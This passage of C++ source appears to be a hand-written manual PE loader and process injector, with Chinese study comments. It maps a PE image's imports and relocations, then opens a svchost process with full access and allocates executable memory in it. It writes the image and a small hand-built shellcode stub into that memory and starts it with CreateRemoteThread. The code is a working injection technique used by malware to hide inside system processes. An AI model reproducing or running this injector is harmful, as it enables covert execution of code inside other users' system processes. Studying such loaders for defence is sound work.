	uiValueB = (ULONG_PTR) & ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];

	// we assume their is an import table to process
	// uiValueC is the first entry in the import table
	uiValueC = (uiBaseAddress + ((PIMAGE_DATA_DIRECTORY)uiValueB)->VirtualAddress);


	DWORD64 _current_process_kern32_base_addr = reinterpret_cast<DWORD64>(GetModuleHandleA("kernel32.dll"));
	// itterate through all imports
	while (((PIMAGE_IMPORT_DESCRIPTOR)uiValueC)->Name)
	{
		// use LoadLibraryA to load the imported module into memory
		//为我们的PE文件加载所有他需要的dll
		// 这里我们并不需要进行加载，因为所有的windows程序都不可避免的需要加载kernel32
		// 也就是说我们现在已经有了kernel32这个dll，只需要使用getmodule获取一下就行了
		// uiLibraryAddress = (ULONG_PTR)LoadLibraryA((LPCSTR)(uiBaseAddress + ((PIMAGE_IMPORT_DESCRIPTOR)uiValueC)->Name));
		uiLibraryAddress = _current_process_kern32_base_addr;
		// uiValueD = VA of the OriginalFirstThunk
		DWORD64	uiValueD = (uiBaseAddress + ((PIMAGE_IMPORT_DESCRIPTOR)uiValueC)->OriginalFirstThunk);

		// uiValueA = VA of the IAT (via first thunk not origionalfirstthunk)
		// 其实我并不理解thunk和IAT的意思
		uiValueA = (uiBaseAddress + ((PIMAGE_IMPORT_DESCRIPTOR)uiValueC)->FirstThunk);

		// itterate through all imported functions, importing by ordinal if no name present
		while (DEREF(uiValueA))
		{
			// sanity check uiValueD as some compilers only import by FirstThunk
			// 通过这个标志位来判断到底是通过ordinal还是funcname的方式来获取函数地址

// uiValueD就是rvaImportLookupTable的地址，这里通过和0x8000000000000000进行and运算来判断是否通过ordinal来定位导入函数的地址
			if (uiValueD && ((PIMAGE_THUNK_DATA)uiValueD)->u1.Ordinal & IMAGE_ORDINAL_FLAG)
			{
				// uiLibraryAddress是导入的DLL在内存中的基地址，这里获取到导入DLL的NT Header地址
				ULONG_PTR	uiExportDir = uiLibraryAddress + ((PIMAGE_DOS_HEADER)uiLibraryAddress)->e_lfanew;

				// 获取到导入DLL的DATA_DIRECTORY结构体的地址
				ULONG_PTR	uiNameArray = (ULONG_PTR) & ((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];

				// 获取到导入DLL的导出表的地址
				uiExportDir = (uiLibraryAddress + ((PIMAGE_DATA_DIRECTORY)uiNameArray)->VirtualAddress);

				// 从导出表中获取到导出函数数组地址
				ULONG_PTR	uiAddressArray = (uiLibraryAddress + ((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfFunctions);

				// 从前面那张导入表结构体的示意图我们知道，如果使用ordinal的方式来定位导入函数的地址，那么除了最高位，剩下的bit位将用于表示ordinal的值
				// 不过这里不知道为啥进行and运算的是0xFFFF，只有16bit，可能ordinal的值最大也就这么大了吧
				// 获取到ordinal value之后，和导出表的base字段值相减，因为每个entry占4bytes，相减的结果乘以4再加上导出函数数组的地址，就是导出函数相对于DLL基地址的偏移的地址
				// 对于同一个dll，同样的函数相对于dll基地址的偏移应该总是相同的
				uiAddressArray += ((IMAGE_ORDINAL(((PIMAGE_THUNK_DATA)uiValueD)->u1.Ordinal) - ((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->Base) * sizeof(DWORD));

				// 使用基地址+偏移得到导入函数的正确地址，并将该地址放到rvaImportAddressTable中
				// 这里我们要使用目标进程的kernel32的基地址
			//	DEREF(uiValueA) = (uiLibraryAddress + DEREF_32(uiAddressArray));
				DEREF(uiValueA) = (_target_process_kernel32_base_addr + DEREF_32(uiAddressArray));
			}
			else
			{
				// 根据导入表结构体示意图我们可以知道，如果最高bit位为0，那么uiValueD中保存的就是IMAGE_IMPORT_BY_NAME结构体的rva
				// 和PE文件的基地址相加即可得到IMAGE_IMPORT_BY_NAME结构体的地址
				uiValueB = (uiBaseAddress + DEREF(uiValueD));

				// 通过GetProcAddress获取指定名称的函数地址，并将其放入rvaImportAddressTable中
				//我们这里依然使用便宜的方式来进行计算
				// DEREF(uiValueA) = (ULONG_PTR)GetProcAddress((HMODULE)uiLibraryAddress, (LPCSTR)((PIMAGE_IMPORT_BY_NAME)uiValueB)->Name);
#ifdef jinyongyutiaoshi
				printf("function name is: %s\n", ((PIMAGE_IMPORT_BY_NAME)uiValueB)->Name);
#endif // jinyongyutiaoshi

				DWORD64 _____ashdjoajoidais = (ULONG_PTR)GetProcAddress((HMODULE)uiLibraryAddress, (LPCSTR)((PIMAGE_IMPORT_BY_NAME)uiValueB)->Name);

#ifdef jinyongyutiaoshi
				printf("this is the function address retrieve from current process's kernel32.dll: %p\n", reinterpret_cast<BYTE*>(_____ashdjoajoidais));
#endif // jinyongyutiaoshi
				DWORD64 _tempoppapsdjioasdjhoiasjda = _____ashdjoajoidais - uiLibraryAddress + _target_process_kernel32_base_addr;
#ifdef jinyongyutiaoshi
				printf("this is the function address after fixed in target process: %p\n", reinterpret_cast<BYTE*>(_tempoppapsdjioasdjhoiasjda));
#endif // jinyongyutiaoshi
				* reinterpret_cast<DWORD64*>(uiValueA) = _tempoppapsdjioasdjhoiasjda;
			}
			// get the next imported function
			uiValueA += sizeof(ULONG_PTR);
			if (uiValueD)
				uiValueD += sizeof(ULONG_PTR);
		}

		// get the next import
		uiValueC += sizeof(IMAGE_IMPORT_DESCRIPTOR);
	}

	// STEP 5: process all of our images relocations...
	// 修正地址

	// calculate the base address delta and perform relocations (even if we load at desired image base)
	// 计算dalta，然后修正地址，这里计算delta的时候，我们应该使用目标进程的基地址，我们现在就来分配


	HANDLE hw = OpenProcess(PROCESS_ALL_ACCESS, 0, _svchost_1_pid);
	if (!hw)
	{
		printf("Process Not found (0x%lX)\n", GetLastError());
		return -1;
	}
	void* _real_base_in_target_process = VirtualAllocEx(hw, NULL, _memeoy_size_to_be_allocated_in_target_process, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	// 	uiLibraryAddress = uiBaseAddress - ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.ImageBase;
	uiLibraryAddress = reinterpret_cast<DWORD64>(_real_base_in_target_process) - ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.ImageBase;

	// uiValueB = the address of the relocation directory
	// .reloc地址
	uiValueB = (ULONG_PTR) & ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

	// check if their are any relocations present
	if (((PIMAGE_DATA_DIRECTORY)uiValueB)->Size)
	{
		// uiValueC is now the first entry (IMAGE_BASE_RELOCATION)
		uiValueC = (uiBaseAddress + ((PIMAGE_DATA_DIRECTORY)uiValueB)->VirtualAddress);

		// and we itterate through all entries...
		while (((PIMAGE_BASE_RELOCATION)uiValueC)->SizeOfBlock)
		{
#ifdef jinyongyutiaoshi
			printf("szie of block in reloc entry: 0x%p\n", reinterpret_cast<BYTE*>(((PIMAGE_BASE_RELOCATION)uiValueC)->SizeOfBlock));
#endif // jinyongyutiaoshi
			// uiValueA = the VA for this relocation block
			uiValueA = (uiBaseAddress + ((PIMAGE_BASE_RELOCATION)uiValueC)->VirtualAddress);

			// uiValueB = number of entries in this relocation block
			// 获取表中的entry数量
			uiValueB = (((PIMAGE_BASE_RELOCATION)uiValueC)->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(IMAGE_RELOC);

			// uiValueD is now the first entry in the current relocation block
			// 跳过头部，就进入了第一个entry
			DWORD64	uiValueD = uiValueC + sizeof(IMAGE_BASE_RELOCATION);

			// we itterate through all the entries in the current block...
			// 遍历所有的entry
			while (uiValueB--)
			{
				// perform the relocation, skipping IMAGE_REL_BASED_ABSOLUTE as required.
				// IMAGE_REL_BASED_ABSOLUTE只用于padding，所以跳过即可
				// we dont use a switch statement to avoid the compiler building a jump table
				// which would not be very position independent!
				if (((PIMAGE_RELOC)uiValueD)->type == IMAGE_REL_BASED_DIR64) {

#ifdef jinyongyutiaoshi
					printf("base reloc offset: 0x%p\n", reinterpret_cast<BYTE*>(((PIMAGE_RELOC)uiValueD)->offset));
					printf("after add to reloc block base: 0x%p\n", reinterpret_cast<BYTE*>(uiValueA + ((PIMAGE_RELOC)uiValueD)->offset));
					printf("here is the value in it, DWORD64: 0x%p\n", reinterpret_cast<DWORD64*>(*reinterpret_cast<DWORD64*>(uiValueA + ((PIMAGE_RELOC)uiValueD)->offset)));
#endif // jinyongyutiaoshi
					// 把这个地方的值取出来，加上delta再放回去即可
					* (ULONG_PTR*)(uiValueA + ((PIMAGE_RELOC)uiValueD)->offset) += uiLibraryAddress;
#ifdef jinyongyutiaoshi
					printf("here is the value after fixed up , DWORD64: 0x%p\n", reinterpret_cast<DWORD64*>(*reinterpret_cast<DWORD64*>(uiValueA + ((PIMAGE_RELOC)uiValueD)->offset)));
#endif // jinyongyutiaoshi
				}
				else if (((PIMAGE_RELOC)uiValueD)->type == IMAGE_REL_BASED_HIGHLOW)
					*(DWORD*)(uiValueA + ((PIMAGE_RELOC)uiValueD)->offset) += (DWORD)uiLibraryAddress;

				else if (((PIMAGE_RELOC)uiValueD)->type == IMAGE_REL_BASED_HIGH)
					*(WORD*)(uiValueA + ((PIMAGE_RELOC)uiValueD)->offset) += HIWORD(uiLibraryAddress);
				else if (((PIMAGE_RELOC)uiValueD)->type == IMAGE_REL_BASED_LOW)
					*(WORD*)(uiValueA + ((PIMAGE_RELOC)uiValueD)->offset) += LOWORD(uiLibraryAddress);

				// get the next entry in the current relocation block
				uiValueD += sizeof(IMAGE_RELOC);
			}

			// get the next entry in the relocation directory
			uiValueC = uiValueC + ((PIMAGE_BASE_RELOCATION)uiValueC)->SizeOfBlock;
		}
	}

	// 现在这个PE我们已经在我们当前进程中加载好了，剩下的就是简单的将其拷贝到目标进程地址中即可

	if (!WriteProcessMemory(hw, _real_base_in_target_process, reinterpret_cast<VOID*>(_pe_addr_load_in_current_process), _memeoy_size_to_be_allocated_in_target_process, NULL))
	{
		printf("Process wirte failed, error code: 0x%x\n", (unsigned int)GetLastError());
		exit(-1);
	}

	//获取入口函数地址，这里使用目标进程的预设基地址
//	uiValueA = (uiBaseAddress + ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.AddressOfEntryPoint);
	uiValueA = (reinterpret_cast<DWORD64>(_real_base_in_target_process) + ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.AddressOfEntryPoint);
	printf("this is the entry point in target process: 0x%p\n", reinterpret_cast<BYTE*>(uiValueA));

	// 这个地址将作为alignrspcall的地址，首先我们需要写入align rsp的那一堆指令

// 把align rsp弄好我就要睡觉了

	void* _2_29bytes = VirtualAllocEx(hw, NULL, 29, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	BYTE _fuckyou1[12] = { 0x56,0x48,0x8B,0xF4,0x48,0x83,0xE4,0xF0,0x48,0x83,0xEC,0x20 };
	if (!WriteProcessMemory(hw, _2_29bytes, _fuckyou1, 12, NULL))
	{
		printf("Process wirte failed, error code: 0x%x\n", (unsigned int)GetLastError());
		exit(-1);
	}
	// mov rax, .....
	BYTE caonimadwozhendefue[2] = { 0x48,0xb8 };
	if (!WriteProcessMemory(hw, (BYTE*)_2_29bytes + 12, caonimadwozhendefue, 2, NULL))
	{
		printf("Process wirte failed, error code: 0x%x\n", (unsigned int)GetLastError());
		exit(-1);
	}
	// 写入地址 8bytes
	if (!WriteProcessMemory(hw, (BYTE*)_2_29bytes + 12 + 2, &uiValueA, 8, NULL))
	{
		printf("Process wirte failed, error code: 0x%x\n", (unsigned int)GetLastError());
		exit(-1);
	}
	// call rax
	BYTE _CAL_RAX[2] = { 0xFF, 0xD0 };
	if (!WriteProcessMemory(hw, (BYTE*)_2_29bytes + 12 + 2 + 8, _CAL_RAX, 2, NULL))
	{
		printf("Process wirte failed, error code: 0x%x\n", (unsigned int)GetLastError());
		exit(-1);
	}

	BYTE _CAL_RA___RET_X[5] = { 0x48, 0x8b, 0xe6, 0x5e, 0xc3 };
	if (!WriteProcessMemory(hw, (BYTE*)_2_29bytes + 12 + 2 + 8 + 2, _CAL_RA___RET_X, 5, NULL))
	{
		printf("Process wirte failed, error code: 0x%x\n", (unsigned int)GetLastError());
		exit(-1);
	}

	// 最后我们创建线程的时候，就从这个地址开始  _2_29bytes
//HANDLE hw = OpenProcess(PROCESS_ALL_ACCESS, 0, _svchost_1_pid);
//、、if (!hw)
//{
//	printf("Process Not found (0x%lX)\n", GetLastError());
//		return -1;
	//}
	/*void* base = VirtualAllocEx(hw, NULL, fileSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!base)
	{
		CloseHandle(hw);
		return -1;
	}
	if (!WriteProcessMemory(hw, base, byteArray, fileSize, NULL))
	{
		printf("write process memory faild (0x%lX)\n", GetLastError());
		CloseHandle(hw);
		return -1;
	}*/
	//	MessageBoxA(NULL, "OK", "OK", MB_OK);
	HANDLE thread = CreateRemoteThread(hw, NULL, NULL, (LPTHREAD_START_ROUTINE)_2_29bytes, NULL, 0, 0);
	if (!thread)
	{
		printf("Failed to create thread 0x%x\n", (unsigned int)GetLastError());
		CloseHandle(hw);
		CloseHandle(thread);
	}
	// 我们这里wait一下，等线程结束就收回资源
	WaitForSingleObject(thread, INFINITE);

	VirtualFreeEx(hw, _real_base_in_target_process, 0, MEM_RELEASE);
	printf("free: 0x%x\n", (unsigned int)GetLastError());
	VirtualFreeEx(hw, _2_29bytes, 0, MEM_RELEASE);
	printf("free: 0x%x\n", (unsigned int)GetLastError());
	//printf(
	return 1;
}
//
//
//BOOL APIENTRY DllMain(HMODULE hModule,
//	DWORD  ul_reason_for_call,
//	LPVOID lpReserved
//)
//{
//
//	switch (ul_reason_for_call)
//	{
//	case DLL_PROCESS_ATTACH:
//		//MessageBoxA(NULL, "OK", "OK", MB_OK);
//		main();
//		break;
//	case DLL_THREAD_ATTACH:
//	case DLL_THREAD_DETACH:
//	case DLL_PROCESS_DETACH:
//		break;
//	}
//	return TRUE;
//}
